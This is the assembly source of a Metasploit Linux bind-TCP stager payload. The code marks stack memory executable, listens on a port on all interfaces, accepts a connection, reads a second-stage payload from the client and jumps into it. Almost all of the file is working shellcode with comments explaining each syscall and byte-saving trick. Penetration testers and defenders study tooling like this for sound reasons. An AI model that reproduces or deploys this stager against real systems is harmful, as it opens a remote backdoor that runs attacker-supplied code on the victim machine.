;;
;
;        Name: stager_sock_bind
;   Qualities: Can Have Nulls
;     Version: $Revision: 1607 $
;     License:
;
;        This file is part of the Metasploit Exploit Framework
;        and is subject to the same licenses and copyrights as
;        the rest of this package.
;
;        With enhancements from the unixasm project by Ramon de Carvalho Valle
;
; Description:
;
;        Implementation of a Linux portbind TCP stager.
;
;        File descriptor in edi.
;
; Meta-Information:
;
; meta-shortname=Linux Bind TCP Stager
; meta-description=Listen on a port for a connection and run a second stage
; meta-authors=skape <mmiller [at] hick.org>
; meta-os=linux
; meta-arch=ia32
; meta-category=stager
; meta-connection-type=bind
; meta-name=bind_tcp
; meta-path=lib/Msf/PayloadComponent/Linux/ia32/BindStager.pm
; meta-offset-lport=0x14
;;
BITS   32
GLOBAL _start

_start:

; int mprotect(const void *addr, size_t len, int prot);
mprotect:
	push byte 0x7d     ; __NR_mprotect
	pop  eax
	cdq
	mov  dl, 0x7       ; prot = 7 = PROT_READ | PROT_WRITE | PROT_EXEC
	mov  ecx, 0x1000   ; len  = PAGE_SIZE (on most systems)
	mov  ebx, esp      ; addr
	and  bx, 0xf000    ; ensure that addr is page-aligned
	int  0x80

	xor  ebx, ebx      ; ebx is the call argument to socketcall
	mul  ebx           ; set edx:eax to 0, we'll need them in a minute

; int socket(int domain, int type, int protocol);
socket:
	push ebx           ; protocol = 0 = first that matches this type and domain, i.e. tcp
	inc  ebx           ; 1 = SYS_SOCKET
	push ebx           ; type     = 1 = SOCK_STREAM
	push byte 0x2      ; domain   = 2 = AF_INET
	mov  ecx, esp      ; socketcall args
	mov  al, 0x66      ; __NR_socketcall
	int  0x80
	; Server socket is now in eax. We'll push it to the stack in a sec and then
	; just reference it from there, no need to store it in a register

; int bind(int sockfd, const struct sockaddr *addr, socklen_t addrlen);
bind:
	pop  ebx           ; 2 = SYS_BIND (this was PF_INET for the call to socket)
	pop  esi           ; 1 = junk - this keeps ecx pointing to the right place
	; set up the sockaddr
	push edx           ; addr->sin_addr = 0 = inet_addr("0.0.0.0")
	push 0xbfbf0002    ; addr->sin_port = 0xbfbf
	                   ; addr->sin_family = 2 = AF_INET
	push byte 0x10     ; addrlen
	push ecx           ; addr (ecx still points to the right place on the stack)
	push eax           ; sockfd ; return value from socket(2) above
	mov  ecx, esp      ; socketcall args
	push byte 0x66     ; __NR_socketcall
	pop  eax
	int  0x80

listen:
	shl  ebx, 1        ; 4 = SYS_LISTEN
	mov  al, 0x66      ; __NR_socketcall
	int  0x80

; At this point the stack will look like this:
;
; [ sockfd         ]  <-- esp, ecx
; [ addr           ]  # pointer to below on the stack
; [ addrlen = 0x66 ]
; [ 0xbfbf0002     ]  <-- *addr
; [ 0x00000000     ]  inet_addr("0.0.0.0")
;
; Since addrlen is ignored if addr is null, we can set esp+4 to NULL and use
; the sockfd that's already on the stack as an argument to accept(2), thus
; avoiding having to set up a full list of args. Conveniently,
;    mov [ecx+4], edx
; is three bytes long, whereas the old sequence:
;    push edx           ; addr = NULL
;    push edx           ; addrlen = NULL
;    push esi           ; sockfd
;    mov  ecx, esp      ; socketcall args
; weighs in at 5


; int accept(int sockfd, struct sockaddr *addr, socklen_t *addrlen);
accept:
	inc  ebx           ; 5 = SYS_ACCEPT
	mov  al, 0x66      ; __NR_socketcall
	mov  [ecx+4], edx
	int  0x80
	xchg eax, ebx      ; client socket is now in ebx

%ifndef USE_SINGLE_STAGE

recv:
	mov  dh, 0xc
	mov  al, 0x3
	int  0x80
	mov  edi, ebx    ; not necessary if second stages use ebx instead of edi
	                 ; for fd
	jmp  ecx

%else
	%ifdef FD_REG_EDI
	mov  edi, ebx
	%endif
%endif
